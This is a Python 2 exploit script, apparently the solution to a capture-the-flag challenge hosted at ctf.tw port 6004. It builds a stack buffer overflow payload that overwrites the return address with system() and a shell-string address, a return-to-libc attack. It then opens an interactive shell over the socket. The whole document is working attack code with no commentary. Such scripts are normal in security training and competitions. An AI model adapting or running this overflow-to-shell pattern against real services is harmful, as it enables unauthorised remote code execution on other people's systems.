#!/usr/bin/python
import struct
import socket
import telnetlib

def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def p(v):
    return struct.pack('<I', v)

def u(v):
    return struct.unpack('<I', v)[0]

def send_payload(f, payload):
    f.write(payload.ljust(0x80, 'A'))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('ctf.tw', 6004))
f = s.makefile('rw', bufsize=0)

system_addr = 0x08048470
shstring_addr = 0x080487cb

payload = '\0' * 92
payload += p(system_addr)
payload += 'A' * 4
payload += p(shstring_addr)
payload += '\e'
print len(payload)

send_payload(f, payload)

t = telnetlib.Telnet()
t.sock = s
t.interact()
